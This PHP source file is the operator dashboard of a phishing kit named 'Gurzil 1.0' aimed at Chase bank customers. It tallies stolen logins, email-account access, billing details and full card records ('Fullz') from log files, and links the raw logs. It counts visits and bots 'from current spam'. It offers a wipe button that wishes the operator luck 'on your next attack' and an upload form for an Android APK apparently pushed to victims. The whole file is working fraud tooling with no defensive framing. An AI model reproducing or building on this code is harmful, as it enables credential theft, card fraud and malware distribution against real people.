<?php

	
    $lines0 = file('../logz/botlist.txt');
    $lines0 = array_unique($lines0);
    file_put_contents('../logz/botlist.txt', implode($lines0));
	
    $lines1 = file('../logz/android_view.txt');
    $lines1 = array_unique($lines1);
    file_put_contents('../logz/android_view.txt', implode($lines1));
	
    $lines2 = file('../logz/download_view.txt');
    $lines2 = array_unique($lines2);
    file_put_contents('../logz/download_view.txt', implode($lines2));

    $lines3 = file('../logz/view.txt');
    $lines3 = array_unique($lines3);
    file_put_contents('../logz/view.txt', implode($lines3));
	
    $lines4 = file('../logz/MyLogz1_view.txt');
    $lines4 = array_unique($lines4);
    file_put_contents('../logz/MyLogz1_view.txt', implode($lines4));	
	
    $lines5 = file('../logz/MyLogz2_view.txt');
    $lines5 = array_unique($lines5);
    file_put_contents('../logz/MyLogz2_view.txt', implode($lines5));	
	
    $lines6 = file('../logz/MyLogz3_view.txt');
    $lines6 = array_unique($lines6);
    file_put_contents('../logz/MyLogz3_view.txt', implode($lines6));	
	
    $lines7 = file('../logz/MyLogz4_view.txt');
    $lines7 = array_unique($lines7);
    file_put_contents('../logz/MyLogz4_view.txt', implode($lines7));		
	
    ob_start();
    session_start();	
    if(!isset($_SESSION['adminuser'])){
        header("Location:" . "./auth-login.php");
        exit;
    }else{
        include './config.php';
    }

    if(isset($_GET['status'])){
        $del_status = $_GET['status'];
    }else{$del_status = 'no';}
    

   if(isset($_FILES['apk'])){
      $errors= array();
      $file_name = "file.apk";
      $file_size = $_FILES['apk']['size'];
      $file_tmp = $_FILES['apk']['tmp_name'];
      $file_type = $_FILES['apk']['type'];
      $file_ext=strtolower(end(explode('.',$_FILES['apk']['name'])));
      
      $extensions= array("apk");
      
      if(in_array($file_ext,$extensions)=== false){
         $errors[]="extension not allowed, please choose a APK file.";
      }
      
      if($file_size > 8097152) {
         $errors[]='File size must be excately 8 MB';
      }
      
      if(empty($errors)==true) {
         move_uploaded_file($file_tmp,"../apk/".$file_name);
         $success ="success";
      }else{
         print_r($errors);
      }
   }
?>


<!doctype html>
<html lang="en">

    <head>
        <meta charset="utf-8"/>
        <title>Dashboard |  Gurzil 1.0 Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content="AP" name="author"/>
        <meta name="robots" content="noindex,nofollow">
		<meta http-equiv="refresh" content="600;url=./index.php">

        
        <!--    Favicon-->
        <link rel="apple-touch-icon" sizes="180x180" href="./assets/images/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="./assets/images/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="./assets/images/favicon-16x16.png">
       
        <link href="assets/libs/slick-slider/slick/slick.css" rel="stylesheet" type="text/css"/>
        <link href="assets/libs/slick-slider/slick/slick-theme.css" rel="stylesheet" type="text/css"/>
        <link href="assets/libs/jqvmap/jqvmap.min.css" rel="stylesheet"/>
        <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="assets/css/icons.min.css" rel="stylesheet" type="text/css"/>
        <link href="assets/css/app.min.css" rel="stylesheet" type="text/css"/>
        <link href="assets/css/stylo.css" rel="stylesheet" type="text/css"/>
                
				<!-- Font Awesome-->
        <script src="https://kit.fontawesome.com/6222530beb.js"></script>
       
    </head>

    <body data-sidebar="dark" data-sidebar-size="small" data-topbar="dark">

        <div id="layout-wrapper">

            <header id="page-topbar">
                <div class="navbar-header">
                    <div class="d-flex">
                        <!-- LOGO -->
                        <div class="navbar-brand-box">
                            <a href="./index.php" class="logo logo-dark">
                                <span class="logo-sm">
                                    <img src="assets/images/unnamed.png" alt="" height="22">
                                </span>
                                <span class="logo-lg">
                                    <img src="assets/images/ee3.png" alt="" height="20">
                                </span>
                            </a>

                            <a href="./index.php" class="logo logo-light">
                                <span class="logo-sm">
                                    <img src="assets/images/unnamed.png" alt="" height="45">
                                </span>
                                <span class="logo-lg">
                                    <img src="assets/images/ee3.png" alt="" height="70">
                                </span>
                            </a>
                        </div>

                        <button type="button" class="btn btn-sm px-3 font-size-24 header-item waves-effect" id="vertical-menu-btn">
                            <i class="mdi mdi-backburger"></i>
                        </button>

                        <!-- App Search-->
                        <form class="app-search d-none d-lg-block" method="post" enctype="multipart/form-data">
                            <div class="position-relative">
                                <input type="text" class="form-control" placeholder="Search...">
                                <span class="mdi mdi-magnify"></span>
                            </div>
                        </form>
                    </div>

                    <div class="d-flex">

                        <div class="dropdown d-inline-block">
                            <button type="button" class="btn header-item waves-effect" id="page-header-flag-dropdown"
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <i class="fas fa-info"></i>
                            </button>
                            <div class="dropdown-menu dropdown-menu-right">
                                <a href="./index.php?status=wipe" class="dropdown-item notify-item" id="sa-position">
                                    <img src="assets/images/flags/russia.jpg" alt="user-image" class="mr-2" height="12"><span class="align-middle">Clear/Wipe Current DATA</span>
                                </a>
                            </div>
                        </div>

                        <div class="dropdown d-none d-lg-inline-block ml-1">
                            <button type="button" class="btn header-item noti-icon waves-effect" data-toggle="fullscreen">
                                <i class="mdi mdi-fullscreen"></i>
                            </button>
                        </div>

                        <div class="dropdown d-inline-block">
                            <button type="button" class="btn header-item waves-effect" id="page-header-user-dropdown"
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <img class="rounded-circle header-profile-user" src="assets/images/unnamed.png"
                                    alt="Header Avatar">
                                <span class="d-none d-sm-inline-block ml-1"><?php echo yourname; ?></span>
                                <i class="mdi mdi-chevron-down d-none d-sm-inline-block"></i>
                            </button>
                            <div class="dropdown-menu dropdown-menu-right">
                                <a class="dropdown-item" href="./setting.php"><i class="mdi mdi-face-profile font-size-16 align-middle mr-1"></i> <?php echo reciever; ?></a>
                                <a class="dropdown-item" href="./index.php?status=wipe" id="alert-success"><i class="mdi mdi-credit-card-outline font-size-16 align-middle mr-1"></i> Delete Data</a>
                                <a class="dropdown-item" href="./setting.php"><i class="mdi mdi-account-settings font-size-16 align-middle mr-1"></i> Config</a>
                                <div class="dropdown-divider"></div>
                                <a class="dropdown-item" href="./auth-logout.php"><i class="mdi mdi-logout font-size-16 align-middle mr-1"></i> Logout</a>
                            </div>
                        </div>
            
                    </div>
                </div>
            </header>

            <!-- ========== Left Sidebar Start ========== -->
            <div class="vertical-menu">

                <div data-simplebar class="h-100">

                    <!--- Sidemenu -->
                    <div id="sidebar-menu">
                        <!-- Left Menu Start -->
                        <ul class="metismenu list-unstyled" id="side-menu">
                            <li class="menu-title">Menu</li>
                            <li>
                                <a href="./index.php" class="waves-effect">
                                    <i class="mdi mdi-view-dashboard"></i>
                                    <span>Dashboard</span>
                                </a>
                            </li>

                            <li>
                                <a href="./setting.php" class=" waves-effect">
                                    <i class="fas fa-cogs"></i>
                                    <span>Config</span>
                                </a>
                            </li>
                            <li>
                                <a href="./info.php" class=" waves-effect">
                                    <i class="fas fa-info-circle"></i>
                                    <span>Info</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <!-- Left Sidebar End -->

            <!-- ============================================================== -->
            <!-- Start right Content here -->
            <!-- ============================================================== -->
            <div class="main-content">

                <div class="page-content">
                    <div class="container-fluid">

                        <!-- start page title -->
                        <div class="row">
                            <div class="col-12">
                                <div class="page-title-box d-flex align-items-center justify-content-between">
                                    <h4 class="mb-0 font-size-18 smack">Dashboard</h4>

                                    <div class="page-title-right">
                                        <ol class="breadcrumb m-0">
                                            <li class="breadcrumb-item smack"><a href="javascript: void(0);" class="smack">RSA 4</a></li>
                                            <li class="breadcrumb-item active">Dashboard</li>
                                        </ol>
                                    </div>
                                    
                                </div>
                            </div>
                        </div>     
                        <!-- end page title -->

                       
<?php
                        //TOTAL LOGIN
    $click1 = "../logz/MyLogz1.txt";
    if(file_exists($click1)){
        $file1 = fopen($click1, "r");
        $total_login = fread($file1, filesize($click1));
        $total_login = substr_count($total_login, "Chase User");
        fclose($file1);
        
        if($total_login == 0) {
            $total_login = "$total_login";
        }else{
            $total_login = "$total_login";
        }
    }else{
        $total_login = 0;
    }
//End TOTAL LOGIN

     //TOTAL LOGIN VIEW
$click2 = "../logz/MyLogz1_view.txt";
if(file_exists($click2)){
    $file2 = fopen($click2, "r");
    $total_login_view = fread($file2, filesize($click2));
    $total_login_view = substr_count($total_login_view, "#>");
    fclose($file2);

    if($total_login_view == 0) {
        $total_login_view = "$total_login_view";
    }else{
        $total_login_view = "$total_login_view";
    }
}else{
    $total_login_view = 0;
}                   
  //END TOTAL LOGIN VIEW                         
                        
  
                        
                        
     //TOTAL MAIL
$click3 = "../logz/MyLogz2.txt";
if(file_exists($click3)){
    $file3 = fopen($click3, "r");
    $total_mail = fread($file3, filesize($click3));
    $total_mail = substr_count($total_mail, "MAIL-ACCESS");
    fclose($file3);

    if($total_mail == 0) {
        $total_mail = "$total_mail";
    }else{
        $total_mail = "$total_mail";
    }
}else{
    $total_mail = 0;
}                   
  //END TOTAL MAIL                         
                        

//TOTAL MAIL VIEW
$click4 = "../logz/MyLogz2_view.txt";
if(file_exists($click4)){
    $file4 = fopen($click4, "r");
    $total_mail_view = fread($file4, filesize($click4));
    $total_mail_view = substr_count($total_mail_view, "#>");
    fclose($file4);

    if($total_mail_view == 0) {
        $total_mail_view = "$total_mail_view";
    }else{
        $total_mail_view = "$total_mail_view";
    }
}else{
    $total_mail_view = 0;
}                  
//END TOTAL MAIL VIEW
                        
                     
                        
//TOTAL FULL
$click5 = "../logz/MyLogz4.txt";
if(file_exists($click5)){
    $file5 = fopen($click5, "r");
    $total_full = fread($file5, filesize($click5));
    $total_full = substr_count($total_full, "CHASE-CARD");
    fclose($file5);

    if($total_full == 0) {
        $total_full = "$total_full";
    }else{
        $total_full = "$total_full";
    }
}else{
    $total_full = 0;
}              
//END TOTAL FULL
                        

//TOTAL FULL VIEW
$click6 = "../logz/MyLogz4_view.txt";
if(file_exists($click6)){
    $file6 = fopen($click6, "r");
    $total_full_view = fread($file6, filesize($click6));
    $total_full_view = substr_count($total_full_view, "#>");
    fclose($file6);

    if($total_full_view == 0) {
        $total_full_view = "$total_full_view";
    }else{
        $total_full_view = "$total_full_view";
    }
}else{
    $total_full_view = 0;
}  
//END TOTAL FULL VIEW
                        
                 
                        
//TOTAL BILL
$click7 = "../logz/MyLogz3.txt";
if(file_exists($click7)){
    $file7 = fopen($click7, "r");
    $total_bill = fread($file7, filesize($click7));
    $total_bill = substr_count($total_bill, "CHASE-BILLING");
    fclose($file7);

    if($total_bill == 0) {
        $total_bill = "$total_bill";
    }else{
        $total_bill = "$total_bill";
    }
}else{
    $total_bill = 0;
}  
//END TOTAL BILL
                        
                        
//TOTAL BILL VIEW
$click8 = "../logz/MyLogz3_view.txt";
if(file_exists($click8)){
    $file8 = fopen($click8, "r");
    $total_bill_view = fread($file8, filesize($click8));
    $total_bill_view = substr_count($total_bill_view, "#>");
    fclose($file8);

    if($total_bill_view == 0) {
        $total_bill_view = "$total_bill_view";
    }else{
        $total_bill_view = "$total_bill_view";
    }
}else{
    $total_bill_view = 0;
}                                            
//EnD TOTAL BILL VIEW
                        

//TOTAL VIEWS
$click9 = "../logz/view.txt";
if(file_exists($click9)){
    $file9 = fopen($click9, "r");
    $total_view = fread($file9, filesize($click9));
    $total_view = substr_count($total_view, "#>");
    fclose($file9);

    if($total_view == 0) {
        $total_view = "$total_view";
    }else{
        $total_view = "$total_view";
    }
}else{
    $total_view = 0;
} 
//END TOTAL VIEWS

                        
//TOTAL BOTS
$click10 = "../logz/botlist.txt";
if(file_exists($click10)){
    $file10 = fopen($click10, "r");
    $total_bots = fread($file10, filesize($click10));
    $total_bots = substr_count($total_bots, "#");
    fclose($file10);

    if($total_bots == 0) {
        $total_bots = "$total_bots";
    }else{
        $total_bots = "$total_bots";
    }
}else{
    $total_bots = 0;
} 
//END TOTAL BOTS 
                        
                        
//TOTAL GMAIL
$click11 = "../logz/MyLogz2.txt";
if(file_exists($click11)){
    $file11 = fopen($click11, "r");
    $total_gmail = fread($file11, filesize($click11));
    $total_gmail = substr_count($total_gmail, "@hotmail") + substr_count($total_gmail, "@yahoo") + substr_count($total_gmail, "@aol.");
    fclose($file11);

    if($total_gmail == 0) {
        $total_gmail = "$total_gmail";
    }else{
        $total_gmail = "$total_gmail";
    }
}else{
    $total_gmail = 0;
}                     
//END TOTAL GMAIL
                        
                        
//TOTAL ANDROID VIEWS
$click12 = "../logz/android_view.txt";
if(file_exists($click12)){
    $file12 = fopen($click12, "r");
    $total_android_view = fread($file12, filesize($click12));
    $total_android_view = substr_count($total_android_view, "#>");
    fclose($file12);

    if($total_android_view == 0) {
        $total_android_view = "$total_android_view";
    }else{
        $total_android_view = "$total_android_view";
    }
}else{
    $total_android_view = 0;
}                     
//END TOTAL ANDROID VIEWS
                        
//TOTAL DOWNLOAD VIEW
$click13 = "../logz/download_view.txt";
if(file_exists($click13)){
    $file13 = fopen($click13, "r");
    $total_downloads = fread($file13, filesize($click13));
    $total_downloads = substr_count($total_downloads, "#>");
    fclose($file13);

    if($total_downloads == 0) {
        $total_downloads = "$total_downloads";
    }else{
        $total_downloads = "$total_downloads";
    }
}else{
    $total_downloads = 0;
}                     
//END TOTAL DOWNLOAD VIEW
                        
    




	
    if($del_status == "wipe") {
        //Check if data exist and then delete all data
        if(file_exists($click10)){unlink("../logz/botlist.txt");}else{}
        if(file_exists($click9)){unlink("../logz/view.txt");}else{}
        if(file_exists($click8)){unlink("../logz/MyLogz3_view.txt");}else{}
        if(file_exists($click7)){unlink("../logz/MyLogz3.txt");}else{}
        if(file_exists($click6)){unlink("../logz/MyLogz4_view.txt");}else{}
        if(file_exists($click5)){unlink("../logz/MyLogz4.txt");}else{}
        if(file_exists($click4)){unlink("../logz/MyLogz2_view.txt");}else{}
        if(file_exists($click3)){unlink("../logz/MyLogz2.txt");}else{}
        if(file_exists($click2)){unlink("../logz/MyLogz1_view.txt");}else{}
        if(file_exists($click1)){unlink("../logz/MyLogz1.txt");}else{}
        if(file_exists($click13)){unlink("../logz/download_view.txt");}else{}
        if(file_exists($click12)){unlink("../logz/android_view.txt");}else{}
		if(file_exists($click11)){unlink("../logz/MyLogz2.txt");}else{}
        
        $display = "<div class='row'>
                           <div class='col-sm-12 text-center'>    
                               <div class='alert alert-success alert-dismissible fade show' role='alert'>
                                    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
                                        <span aria-hidden='true'>&times;</span>
                                    </button>
                                    <strong>Data Cleared Successfully!</strong> Best of luck on your next attack.
                                </div>
                           </div>
                       </div>";
        header("Refresh:2;url="."./index.php");
}elseif($del_status === "no"){}
                

?>
                       
                       <?php if(isset($display)){echo $display;} ?>
                       
                        <div class="row">
                            <div class="col-sm-6 col-xl-3">
                               <a href="../logz/MyLogz1.txt" target="_blank">
                                <div class="card">
                                    <div class="card-body">
                                        <div class="media">
                                            <div class="media-body">
                                                <h5 class="font-size-14">Logins</h5>
                                            </div>
                                            <div class="avatar-xs">
                                                <span class="avatar-title rounded-circle bg-primary">
                                                    <i class="dripicons-box"></i>
                                                </span>
                                            </div>
                                        </div>
                                        <h4 class="m-0 align-self-center"><?php echo $total_login; ?></h4>
                                        <p class="mb-0 mt-3 text-muted"><span class="text-success"><?php echo $total_login_view; ?> Views<i class="mdi mdi-trending-up mr-1"></i></span> From current spam</p>
                                    </div>
                                </div>
                                </a>
                            </div>
    
                            <div class="col-sm-6 col-xl-3">
                               <a href="../logz/MyLogz2.txt" target="_blank">
                                <div class="card">
                                    <div class="card-body">
                                        <div class="media">
                                            <div class="media-body">
                                                <h5 class="font-size-14">Email Access</h5>
                                            </div>
                                            <div class="avatar-xs">
                                                <span class="avatar-title rounded-circle bg-primary">
                                                    <i class="dripicons-briefcase"></i>
                                                </span>
                                            </div>
                                        </div>
                                        <h4 class="m-0 align-self-center"><?php echo $total_mail; ?></h4>
                                        <p class="mb-0 mt-3 text-muted"><span class="text-success"><?php echo $total_mail_view; ?> Views<i class="mdi mdi-trending-up mr-1"></i></span> From current spam</p>
                                    </div>
                                </div>
                                </a>
                            </div>

                            <div class="col-sm-6 col-xl-3">
                               <a href="../logz/MyLogz3.txt" target="_blank">
                                <div class="card">
                                    <div class="card-body">
                                        <div class="media">
                                            <div class="media-body">
                                                <h5 class="font-size-14">Billing</h5>
                                            </div>
                                            <div class="avatar-xs">
                                                <span class="avatar-title rounded-circle bg-primary">
                                                    <i class="dripicons-tags"></i>
                                                </span>
                                            </div>
                                        </div>
                                        <h4 class="m-0 align-self-center"><?php echo $total_bill; ?></h4>
                                        <p class="mb-0 mt-3 text-muted"><span class="text-success"><?php echo $total_bill_view; ?> Views<i class="mdi mdi-trending-up mr-1"></i></span> From current spam</p>
                                    </div>
                                </div>
                                </a>
                            </div>

                            <div class="col-sm-6 col-xl-3">
                               <a href="../logz/MyLogz4.txt" target="_blank">
                                <div class="card">
                                    <div class="card-body">
                                        <div class="media">
                                            <div class="media-body">
                                                <h5 class="font-size-14">Fullz</h5>
                                            </div>
                                            <div class="avatar-xs">
                                                <span class="avatar-title rounded-circle bg-primary">
                                                    <i class="dripicons-cart"></i>
                                                </span>
                                            </div>
                                        </div>
                                        <h4 class="m-0 align-self-center"><?php echo $total_full; ?></h4>
                                        <p class="mb-0 mt-3 text-muted"><span class="text-success"><?php echo $total_full_view; ?> Views<i class="mdi mdi-trending-up mr-1"></i></span> From current spam</p>
                                    </div>
                                </div>
                                </a>
                            </div>
    
                        </div> 
                        <!-- end row -->

                        <div class="row">
                            
                            <div class="col-sm-6 col-xl-3">
                               <a href="../logz/android_view.txt" target="_blank">
                                <div class="card">
                                    <div class="card-body">
                                        <div class="media">
                                            <div class="media-body">
                                                <h5 class="font-size-14">Android Views</h5>
                                            </div>
                                            <div class="avatar-xs">
                                                <span class="avatar-title rounded-circle bg-primary">
                                                    <i class="dripicons-briefcase"></i>
                                                </span>
                                            </div>
                                        </div>
                                        <h4 class="m-0 align-self-center"><?php echo $total_android_view; ?></h4>
                                        <p class="mb-0 mt-3 text-muted"><span class="text-success"><?php echo $total_downloads; ?> Downloads<i class="mdi mdi-trending-up mr-1"></i></span> From current spam</p>
                                    </div>
                                </div>
                                </a>
                            </div>
                            
                            <div class="col-sm-6 col-xl-3">
                               <a href="../logz/MyLogz2.txt" target="_blank">
                                <div class="card">
                                    <div class="card-body">
                                        <div class="media">
                                            <div class="media-body">
                                                <h5 class="font-size-14">Hotmail / Yahoo / Aol</h5>
                                            </div>
                                            <div class="avatar-xs">
                                                <span class="avatar-title rounded-circle bg-primary">
                                                    <i class="dripicons-briefcase"></i>
                                                </span>
                                            </div>
                                        </div>
                                        <h4 class="m-0 align-self-center"><?php echo $total_gmail; ?></h4>
                                        <p class="mb-0 mt-3 text-muted"><span class="text-success"><?php echo $total_mail_view; ?> Views<i class="mdi mdi-trending-up mr-1"></i></span> From current spam</p>
                                    </div>
                                </div>
                                </a>
                            </div>

                            <div class="col-xs-4 col-sm-4 col-md-6 col-xl-6  ">
                                <div class="card">
                                    <div class="card-body">
                                        <h4 class="header-title mb-4">Clicks Vs. Bots</h4>

                                        <div dir="ltr">
                                            
                                            <div class="slick-slider slider-for hori-timeline-desc pt-0">
                                                <div>
                                                    <p class="font-size-16">Number of Views</p>
                                                    <h4 class="mb-4"><?php echo $total_view; ?></h4>
                                                </div>
                                                <div>
                                                    <p class="font-size-16">Number of Bots</p>
                                                    <h4 class="mb-4"><?php echo $total_bots; ?></h4>
                                                </div>
                                            </div>

                                            <div class="row justify-content-center mb-3">
                                                <div class="col-lg-11">
                                                    <div class="slick-slider slider-nav hori-timeline-nav">
                                                        
                                                        <div class="slider-nav-item">
                                                           <a href="../logz/botlist.txt" target="_blank">
                                                            <h5 class="nav-title font-size-14 mb-0 botinho"> View Bot List</h5>
                                                            </a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
									
									
									
									
									
																
									
											
						<div class="col-xs-4 col-sm-4 col-md-6 col-xl-6  ">
                            <div class="card">
                                <div class="card-body">
                              	      <p><h5 class="nav-title font-size-14 mb-0 botinho"> Update APK </h5></p>
									
							
                                        <form action = "" method = "POST" enctype = "multipart/form-data">
                                            <input type = "file" name = "apk"/>
                                            <input type = "submit"/>
	  	                        	         
                                            <ul>
                                               <li>Sent file: <?php echo $_FILES['apk']['name'];  ?></li>
                                               <li>File size: <?php echo $_FILES['apk']['size'];  ?></li>
                                               <li>File type: <?php echo $_FILES['apk']['type']; ?></li>
											   <?php print_r($success); ?>
                                            </ul>
	  	                        	
                                        </form>
		
									
							    </div>
							</div>	
						</div>		
											
					
									
									
									
									
									
									
									
									
									
                                </div>
                            </div>
                        </div>
                        <!-- end row -->

                        
                    </div> <!-- container-fluid -->
                </div>
                <!-- End Page-content -->

                
                <footer class="footer">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-sm-6">
                                2020 © Gurzil 1.0.
                            </div>
                            <div class="col-sm-6">
                                <div class="text-sm-right d-none d-sm-block">
                                    Crafted with <i class="mdi mdi-heart text-danger"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
            <!-- end main content-->

        </div>
        <!-- END layout-wrapper -->
        
        <!-- JAVASCRIPT -->
        <script src="assets/libs/jquery/jquery.min.js"></script>
        <script src="assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
        <script src="assets/libs/metismenu/metisMenu.min.js"></script>
        <script src="assets/libs/simplebar/simplebar.min.js"></script>
        <script src="assets/libs/node-waves/waves.min.js"></script>

        

        <!-- Jq vector map -->
        <script src="assets/libs/jqvmap/jquery.vmap.min.js"></script>
        <script src="assets/libs/jqvmap/maps/jquery.vmap.usa.js"></script>
        <script src="assets/js/pages/dashboard.init.js"></script>
        <script src="assets/js/app.js"></script>
        
    
    </body>
</html>